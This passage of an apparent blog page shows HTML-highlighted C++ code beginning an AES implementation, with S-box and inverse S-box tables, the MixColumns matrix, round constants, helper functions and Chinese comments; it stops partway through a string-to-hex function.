class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iomanip&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">AddRoundKey</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> mtx[],<span class="hljs-type">uint32_t</span> w[])</span></span>;<br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">SubKeys</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> temp)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SubBytes</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> mtx[],<span class="hljs-type">int</span> len)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">KeyExpansion</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> key[], <span class="hljs-type">uint32_t</span> new_key[])</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Display</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> Matrix[])</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">DisplayKeys</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> Matrix[][<span class="hljs-number">16</span>])</span></span>;<br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">left_bit_move</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> val, <span class="hljs-type">int</span> n)</span></span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">uint32_t</span> T[<span class="hljs-number">4</span>][<span class="hljs-number">256</span>];<span class="hljs-comment">//存储4张列混淆表</span><br><span class="hljs-type">int</span> mixCol[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = {<br>        {<span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>},<br>        {<span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>},<br>        {<span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x03</span>},<br>        {<span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x02</span>}<br>};<span class="hljs-comment">//列混淆矩阵</span><br><span class="hljs-type">uint8_t</span> S_Box[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] =<br>        {<br>                {<span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>},<br>                {<span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>},<br>                {<span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>},<br>                {<span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>},<br>                {<span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>},<br>                {<span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>},<br>                {<span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>},<br>                {<span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>},<br>                {<span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>},<br>                {<span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>},<br>                {<span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>},<br>                {<span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>},<br>                {<span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>},<br>                {<span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>},<br>                {<span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>},<br>                {<span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>}<br>        };<br><span class="hljs-comment">//逆S盒</span><br><span class="hljs-type">uint8_t</span> Inv_S_Box[<span class="hljs-number">16</span>][<span class="hljs-number">16</span>] =<br>        {<br>                {<span class="hljs-number">0x52</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xFB</span>},<br>                {<span class="hljs-number">0x7C</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCB</span>},<br>                {<span class="hljs-number">0x54</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x4E</span>},<br>                {<span class="hljs-number">0x08</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x25</span>},<br>                {<span class="hljs-number">0x72</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x92</span>},<br>                {<span class="hljs-number">0x6C</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x84</span>},<br>                {<span class="hljs-number">0x90</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x06</span>},<br>                {<span class="hljs-number">0xD0</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x6B</span>},<br>                {<span class="hljs-number">0x3A</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x73</span>},<br>                {<span class="hljs-number">0x96</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0x6E</span>},<br>                {<span class="hljs-number">0x47</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x1B</span>},<br>                {<span class="hljs-number">0xFC</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xF4</span>},<br>                {<span class="hljs-number">0x1F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>},<br>                {<span class="hljs-number">0x60</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xEF</span>},<br>                {<span class="hljs-number">0xA0</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x61</span>},<br>                {<span class="hljs-number">0x17</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x7D</span>}<br>        };<br><span class="hljs-comment">//轮密钥加</span><br><span class="hljs-type">uint32_t</span> LunMiYaoJia[<span class="hljs-number">10</span>] = {<span class="hljs-number">0x01000000</span>, <span class="hljs-number">0x02000000</span>, <span class="hljs-number">0x04000000</span>, <span class="hljs-number">0x08000000</span>, <span class="hljs-number">0x10000000</span>,<br>                            <span class="hljs-number">0x20000000</span>, <span class="hljs-number">0x40000000</span>, <span class="hljs-number">0x80000000</span>, <span class="hljs-number">0x1b000000</span>, <span class="hljs-number">0x36000000</span>};<br><span class="hljs-function"><span class="hljs-type">uint32_t</span> <span class="hljs-title">left_bit_move</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> val, <span class="hljs-type">int</span> n)</span> </span>{<br>    <span class="hljs-type">uint32_t</span> size = <span class="hljs-built_in">sizeof</span>(val) * <span class="hljs-number">8</span>;<br>    n = n % size;<br>    <span class="hljs-keyword">return</span> (val &gt;&gt; (size - n) | (val &lt;&lt; n));<span class="hljs-comment">//左移</span><br>    <span class="hljs-comment">//return (val &lt;&lt; (size - n) | (val &gt;&gt; n));//右移</span><br>}<br><span class="hljs-function">string <span class="hljs-title">string_to_hex</span><span class="hljs-params">(<span class="hljs-type">const</span> string&amp; str)</span> <span class="hljs-comment">//字符串转化为十六进制</span></span><br><span class="hljs-function"></span>{<br>    string result=<span class="hljs-string">""</span>;<br>    string tmp;<br>    stringstream ss;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;str.<span class="hljs-built_in">size</span>();i++)<br>    